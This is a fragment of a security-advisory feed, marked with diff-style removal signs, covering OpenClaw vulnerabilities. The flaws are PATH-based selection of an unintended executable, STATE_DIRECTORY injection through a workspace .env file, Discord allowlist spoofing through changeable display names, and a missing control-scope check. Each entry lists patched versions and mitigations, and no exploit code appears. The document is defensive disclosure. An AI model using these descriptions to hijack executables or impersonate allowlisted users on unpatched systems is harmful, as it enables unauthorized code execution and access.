-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Workspace-derived service PATH could influence trash command selection]]></title>
-        <id>https://github.com/advisories/GHSA-rx78-29qr-5hq8</id>
-        <link href="https://github.com/advisories/GHSA-rx78-29qr-5hq8"/>
-        <updated>2026-06-18T20:41:38.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Workspace-derived service PATH could influence trash command selection. In affected versions, a workspace-derived environment path could select an unintended <code>trash</code> executable during maintenance.</p>
-<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
-<h3 id="impact">Impact</h3>
-<p>When the affected feature is enabled and reachable, this could run a local executable from a path the operator did not intend for maintenance tasks. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
-<h3 id="patched-versions">Patched Versions</h3>
-<p>The first stable patched version is <code>2026.5.2</code>.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>keep maintenance flows on trusted workspaces and fixed service paths until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rx78-29qr-5hq8">https://github.com/openclaw/openclaw/security/advisories/GHSA-rx78-29qr-5hq8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53865">https://nvd.nist.gov/vuln/detail/CVE-2026-53865</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-arbitrary-command-execution-via-workspace-derived-service-path">https://www.vulncheck.com/advisories/openclaw-arbitrary-command-execution-via-workspace-derived-service-path</a></li>
-<li><a href="https://github.com/advisories/GHSA-rx78-29qr-5hq8">https://github.com/advisories/GHSA-rx78-29qr-5hq8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rx78-29qr-5hq8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-18T20:41:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: Workspace-derived service PATH could influence trash command selection]]></title>
-        <id>https://github.com/advisories/GHSA-2w22-3f6x-3hf4</id>
-        <link href="https://github.com/advisories/GHSA-2w22-3f6x-3hf4"/>
-        <updated>2026-06-18T20:41:01.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-rx78-29qr-5hq8. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>OpenClaw before 2026.5.2 contains a path traversal vulnerability in maintenance task execution that allows workspace-derived service paths to influence trash command selection. Attackers can execute unintended local executables from operator-unintended paths during maintenance operations by manipulating workspace-derived environment paths.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rx78-29qr-5hq8">https://github.com/openclaw/openclaw/security/advisories/GHSA-rx78-29qr-5hq8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53865">https://nvd.nist.gov/vuln/detail/CVE-2026-53865</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-arbitrary-command-execution-via-workspace-derived-service-path">https://www.vulncheck.com/advisories/openclaw-arbitrary-command-execution-via-workspace-derived-service-path</a></li>
-<li><a href="https://github.com/advisories/GHSA-2w22-3f6x-3hf4">https://github.com/advisories/GHSA-2w22-3f6x-3hf4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2w22-3f6x-3hf4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-16T21:32:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Workspace .env STATE_DIRECTORY could influence bundled runtime dependency roots]]></title>
-        <id>https://github.com/advisories/GHSA-wc84-j36w-pw4x</id>
-        <link href="https://github.com/advisories/GHSA-wc84-j36w-pw4x"/>
-        <updated>2026-06-18T20:39:20.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Workspace .env STATE_DIRECTORY could influence bundled runtime dependency roots. In affected versions, a workspace <code>.env</code> in a repository opened by a trusted operator could set <code>STATE_DIRECTORY</code> before runtime dependency root resolution.</p>
-<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
-<h3 id="impact">Impact</h3>
-<p>When the affected feature is enabled and reachable, this could load bundled runtime dependencies from an unintended local state path. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
-<h3 id="patched-versions">Patched Versions</h3>
-<p>The first stable patched version is <code>2026.5.2</code>.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>avoid opening untrusted workspace env files before runtime dependency installation until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-wc84-j36w-pw4x">https://github.com/openclaw/openclaw/security/advisories/GHSA-wc84-j36w-pw4x</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53858">https://nvd.nist.gov/vuln/detail/CVE-2026-53858</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-arbitrary-runtime-dependency-loading-via-state-directory-environment-variable">https://www.vulncheck.com/advisories/openclaw-arbitrary-runtime-dependency-loading-via-state-directory-environment-variable</a></li>
-<li><a href="https://github.com/advisories/GHSA-wc84-j36w-pw4x">https://github.com/advisories/GHSA-wc84-j36w-pw4x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wc84-j36w-pw4x</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-18T20:39:19.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: Workspace .env STATE_DIRECTORY could influence bundled runtime dependency roots]]></title>
-        <id>https://github.com/advisories/GHSA-4qgr-57jq-93vh</id>
-        <link href="https://github.com/advisories/GHSA-4qgr-57jq-93vh"/>
-        <updated>2026-06-18T20:38:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-wc84-j36w-pw4x. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>OpenClaw before 2026.5.2 contains an environment variable injection vulnerability where workspace .env STATE_DIRECTORY could influence bundled runtime dependency roots. Attackers can manipulate the STATE_DIRECTORY variable to load runtime dependencies from unintended local paths, potentially executing malicious code during dependency resolution.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-wc84-j36w-pw4x">https://github.com/openclaw/openclaw/security/advisories/GHSA-wc84-j36w-pw4x</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53858">https://nvd.nist.gov/vuln/detail/CVE-2026-53858</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-arbitrary-runtime-dependency-loading-via-state-directory-environment-variable">https://www.vulncheck.com/advisories/openclaw-arbitrary-runtime-dependency-loading-via-state-directory-environment-variable</a></li>
-<li><a href="https://github.com/advisories/GHSA-4qgr-57jq-93vh">https://github.com/advisories/GHSA-4qgr-57jq-93vh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4qgr-57jq-93vh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-16T21:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Discord allowFrom could bind to mutable display names]]></title>
-        <id>https://github.com/advisories/GHSA-cw4q-gqg5-g38h</id>
-        <link href="https://github.com/advisories/GHSA-cw4q-gqg5-g38h"/>
-        <updated>2026-06-18T20:36:32.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Discord allowFrom could bind to mutable display names. In affected versions, a Discord account able to change display or global name metadata could match a policy entry through mutable display metadata.</p>
-<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
-<h3 id="impact">Impact</h3>
-<p>When the affected feature is enabled and reachable, this could receive agent access intended for another Discord identity. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
-<h3 id="patched-versions">Patched Versions</h3>
-<p>The first stable patched version is <code>2026.5.7</code>.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>use stable Discord user IDs in allowlists until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-cw4q-gqg5-g38h">https://github.com/openclaw/openclaw/security/advisories/GHSA-cw4q-gqg5-g38h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53849">https://nvd.nist.gov/vuln/detail/CVE-2026-53849</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-mutable-discord-display-names-in-allowfrom">https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-mutable-discord-display-names-in-allowfrom</a></li>
-<li><a href="https://github.com/advisories/GHSA-cw4q-gqg5-g38h">https://github.com/advisories/GHSA-cw4q-gqg5-g38h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cw4q-gqg5-g38h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-18T20:36:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: Discord allowFrom could bind to mutable display names]]></title>
-        <id>https://github.com/advisories/GHSA-p44v-rx83-vjp4</id>
-        <link href="https://github.com/advisories/GHSA-p44v-rx83-vjp4"/>
-        <updated>2026-06-18T20:35:47.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-cw4q-gqg5-g38h. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>OpenClaw before 2026.5.7 contains a privilege escalation vulnerability where the allowFrom feature improperly validates Discord account identity using mutable display names instead of immutable user IDs. Attackers with Discord accounts can change their display name to match a policy entry and gain unauthorized agent access intended for another Discord identity.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-cw4q-gqg5-g38h">https://github.com/openclaw/openclaw/security/advisories/GHSA-cw4q-gqg5-g38h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53849">https://nvd.nist.gov/vuln/detail/CVE-2026-53849</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-mutable-discord-display-names-in-allowfrom">https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-mutable-discord-display-names-in-allowfrom</a></li>
-<li><a href="https://github.com/advisories/GHSA-p44v-rx83-vjp4">https://github.com/advisories/GHSA-p44v-rx83-vjp4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p44v-rx83-vjp4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-16T21:31:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Focus command could miss controlScope enforcement]]></title>
-        <id>https://github.com/advisories/GHSA-mpc8-jxjh-qpgh</id>
-        <link href="https://github.com/advisories/GHSA-mpc8-jxjh-qpgh"/>
-        <updated>2026-06-18T20:34:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Focus command could miss controlScope enforcement. In affected versions, a caller able to trigger the focus command could run the command without enforcing the expected control scope.</p>
-<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
-<h3 id="impact">Impact</h3>
-<p>When the affected feature is enabled and reachable, this could change focus state outside the intended caller authority. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
-<h3 id="patched-versions">Patched Versions</h3>
-<p>The first stable patched version is <code>2026.4.25</code>.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>restrict focus command access to trusted operators until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-mpc8-jxjh-qpgh">https://github.com/openclaw/openclaw/security/advisories/GHSA-mpc8-jxjh-qpgh</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53850">https://nvd.nist.gov/vuln/detail/CVE-2026-53850</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-control-scope-enforcement-bypass-in-focus-command">https://www.vulncheck.com/advisories/openclaw-control-scope-enforcement-bypass-in-focus-command</a></li>
-<li><a href="https://github.com/advisories/GHSA-mpc8-jxjh-qpgh">https://github.com/advisories/GHSA-mpc8-jxjh-qpgh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mpc8-jxjh-qpgh</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-18T20:34:46.000Z</published>
     </entry>
 </feed>
